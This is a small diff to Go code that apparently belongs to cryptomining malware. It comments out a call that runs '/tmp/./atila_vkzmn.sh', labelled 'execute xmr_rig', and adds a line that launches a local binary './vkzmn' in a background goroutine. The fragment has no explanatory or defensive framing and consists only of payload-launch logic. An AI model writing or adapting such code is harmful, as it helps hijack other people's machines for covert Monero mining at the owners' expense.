@@ -44,13 +44,19 @@ if  err_open == nil  {
 
 
 
-run_atila_vkzmn :=  exec.Command("sh"  , "-c"  ,  "/tmp/./atila_vkzmn.sh") //execute xmr_rig
+//run_atila_vkzmn :=  exec.Command("sh"  , "-c"  ,  "/tmp/./atila_vkzmn.sh") //execute xmr_rig
 
 
 
-go run_atila_vkzmn.Run()
+ 
+teste :=  exec.Command("./vkzmn" )
+ 
 
 
+//go run_atila_vkzmn.Run()
+
+
+go  teste.Run()
 
 
 }
